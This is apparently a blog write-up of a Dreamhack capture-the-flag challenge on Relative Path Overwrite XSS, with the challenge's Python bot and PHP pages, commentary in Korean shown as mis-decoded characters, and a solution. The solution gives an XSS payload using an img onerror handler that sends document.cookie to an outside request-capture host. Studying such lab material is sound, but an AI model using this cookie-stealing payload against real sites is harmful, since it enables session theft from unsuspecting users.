---
title: "[2025-08-17] RPO"
excerpt: "RPO"

categories:
  - Problem
tags:
  - [XSS, RPO]

permalink: /Problem/[2025-08-17] RPO/

toc: true
toc_sticky: true

date: 2025-08-17
last_modified_at: 2025-08-17
---

## ğŸ¦¥ ë³¸ë¬¸

- bot.py
    
    ```jsx
    from selenium import webdriver
    from selenium.webdriver.chrome.service import Service
    import sys
    import base64
    
    if len(sys.argv) < 2:
        exit(-1)
    
    if len(sys.argv[1]) == 0:
        exit(-1)
    
    path = base64.b64decode(sys.argv[1]).decode('latin-1')
    
    try:
        FLAG = open('/flag.txt', 'r').read()
    except:
        FLAG = '[**FLAG**]'
    
    def read_url(url, cookie={'name': 'name', 'value': 'value'}):
        cookie.update({'domain':'127.0.0.1'})
        try:
            service = Service(executable_path="/chromedriver")
            options = webdriver.ChromeOptions()
            for _ in ['headless', 'window-size=1920x1080', 'disable-gpu', 'no-sandbox', 'disable-dev-shm-usage']:
                options.add_argument(_)
            driver = webdriver.Chrome(service=service, options=options)
            driver.implicitly_wait(3)
            driver.set_page_load_timeout(3)
            driver.get('http://127.0.0.1/')
            driver.add_cookie(cookie)
            driver.get(url)
    
        except Exception as e:
            driver.quit()
            return False
        driver.quit()
        return True
    
    def check_xss(path, cookie={'name': 'name', 'value': 'value'}):
        url = f'http://127.0.0.1/{path}'
        return read_url(url, cookie)
    
    if not check_xss(path, {'name': 'flag', 'value': FLAG.strip()}):
        print('<script>alert("wrong??");history.go(-1);</script>')
    else:
        print('<script>alert("good");history.go(-1);</script>')
    
    ```
    
    - `check_xss()` ì—ì„œ ì¿ í‚¤ì— flagë¥¼ ì§‘ì–´ ë„£ê³  `read_url()`ì„ í†µí•´ ì›¹ë“œë¼ì´ë²„ë¡œ ì‹¤í–‰
- index.php
    
    ```php
    <html>
    <head>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap.min.css">
    <title>Relative-Path-Overwrite</title>
    </head>
    <body>
        <!-- Fixed navbar -->
        <nav class="navbar navbar-default navbar-fixed-top">
          <div class="container">
            <div class="navbar-header">
              <a class="navbar-brand" href="/">Relative-Path-Overwrite</a>
            </div>
            <div id="navbar">
              <ul class="nav navbar-nav">
                <li><a href="/">Home</a></li>
                <li><a href="/?page=vuln&param=dreamhack">Vuln page</a></li>
                <li><a href="/?page=report">Report</a></li>
              </ul>
    
            </div><!--/.nav-collapse -->
          </div>
        </nav><br/><br/><br/>
        <div class="container">
          <?php
              $page = $_GET['page'] ? $_GET['page'].'.php' : 'main.php';
              if (!strpos($page, "..") && !strpos($page, ":") && !strpos($page, "/"))
                  include $page;
          ?>
        </div> 
    </body>
    </html>
    
    ```
    
    - page íŒŒë¼ë¯¸í„°ë¥¼ í†µí•´ `.php` íŒŒì¼ ì‹¤í–‰. ì´ ë•Œ `..`ì´ë‚˜ `:`ì´ë‚˜ `/`ëŠ” í•„í„°ë§
- report.php
    
    ```php
    <?php
    if(isset($_POST['path'])){
        exec(escapeshellcmd("python3 /bot.py " . escapeshellarg(base64_encode($_POST['path']))) . " 2>/dev/null &", $output);
        echo($output[0]);
    }
    ?>
    
    <form method="POST" class="form-inline">
        <div class="form-group">
            <label class="sr-only" for="path">/</label>
            <div class="input-group">
                <div class="input-group-addon">http://127.0.0.1/</div>
                <input type="text" class="form-control" id="path" name="path" placeholder="/">
            </div>
        </div>
        <button type="submit" class="btn btn-primary">Report</button>
    </form>
    
    ```
    
    - ì•„ë˜ì™€ ê°™ì€ ì½”ë“œ ì‹¤í–‰
        
        ```php
        python3 /bot.py <Base64ë¡œ ì¸ì½”ë”©ëœ path> 2>/dev/null &
        ```
        
        - ì´ ë•Œ escapeë¥¼ ì‚¬ìš©í•˜ì—¬ CLI Injection í”¼í•¨
        - `2>/dev/null` : ì—ëŸ¬ ì¶œë ¥ì€ ì „ë¶€ ë¬´ì‹œ
        - `&` : ë°±ê·¸ë¼ìš´ë“œ ì‹¤í–‰
- vuln.php
    
    ```jsx
    <script src="filter.js"></script>
    <pre id=param></pre>
    <script>
        var param_elem = document.getElementById("param");
        var url = new URL(window.location.href);
        var param = url.searchParams.get("param");
        if (typeof filter !== 'undefined') {
            for (var i = 0; i < filter.length; i++) {
                if (param.toLowerCase().includes(filter[i])) {
                    param = "nope !!";
                    break;
                }
            }
        }
    
        param_elem.innerHTML = param;
    </script>
    ```
    
    - í˜„ì¬ URLì˜ param ê°’ì„ ê°€ì ¸ì™€ì„œ í•„í„°ë§ í›„ `<pre>` íƒœê·¸ì— ì§‘ì–´ ë„£ìŒ
    - filter.jsê°€ ìƒëŒ€ ì£¼ì†Œë¡œ ë˜ì–´ ìˆì–´ì„œ í•„í„°ë§ì„ ìˆ˜í–‰ ì•ˆ ì‹œí‚¬ ìˆ˜ ìˆìŒ

flagë¥¼ ì–»ìœ¼ë ¤ë©´ ì›¹ë“œë¼ì´ë²„ì— ë“¤ì–´ê°€ì„œ ì¿ í‚¤ì— ìˆëŠ” ê°’ì„ ì•Œì•„ë‚´ì•¼ í•¨. 

ì¦‰ ì²«ë²ˆì§¸ë¡œëŠ” `/report` APIì— ìš”ì²­ì„ ë³´ë‚´ì•¼ í•¨

`index.php`ì—ì„œ í˜ì´ì§€ë¥¼ ì‹¤í–‰ì‹œì¼œì•¼ ìƒëŒ€ ê²½ë¡œì¸ `fileter.js`ì˜ í•„í„°ë§ì„ í”¼í•  ìˆ˜ ìˆìŒ

ê·¸ë¦¬ê³  ì¿ í‚¤ë¥¼ ì–»ìœ¼ë ¤ë©´ ì™¸ë¶€ì—ì„œ ì ‘ê·¼ì´ ê°€ëŠ¥í•´ì•¼ í•¨ 

### í’€ì´ ê³¼ì •

1. report í˜ì´ì§€ ë‚´ì—ì„œ ì•„ë˜ì™€ ê°™ì€ ì½”ë“œ ì‚½ì… í›„ ë³´ëƒ„
    
    ```php
    index.php/?page=vuln&param=<img src=@ onerror=location.href="https://ejjwaqq.request.dreamhack.games/"%2bdocument.cookie>
    ```
    
    - ì›¹ ë“œë¼ì´ë²„ì—ì„œ `index.php`ë¥¼ ë“¤ì–´ê°. í•´ë‹¹ í˜ì´ì§€ì—ì„œ `vuln.php`ë¥¼ ì‹¤í–‰
    - `vuln.php`ì—ì„œ `<img onerror>`ë¥¼ í†µí•´ë“œë¦¼í•µ íˆ´ì¦ˆë¡œ ì¿ í‚¤ë¥¼ ë³´ëƒ„
    - ì¸ì½”ë”© â†’ ë””ì½”ë”© â†’ ë””ì½”ë”© ìˆœìœ¼ë¡œ ì§„í–‰ë˜ë¯€ë¡œ `+` ëŠ” ë¯¸ë¦¬ ì¸ì½”ë”©ì„ ì‹œì¼œë†”ì•¼ í•¨
    - ê·¸ë¦¬ê³  ì´ë•Œ filter.jsëŠ” `index.php/filter.js` ê°™ì´ ì˜ëª»ëœ ê²½ë¡œë¡œ ìš”ì²­
2. ë“œë¦¼í•µ íˆ´ì¦ˆì—ì„œ í•´ë‹¹í•˜ëŠ” flagë¥¼ ì–»ì„ ìˆ˜ ìˆìŒ
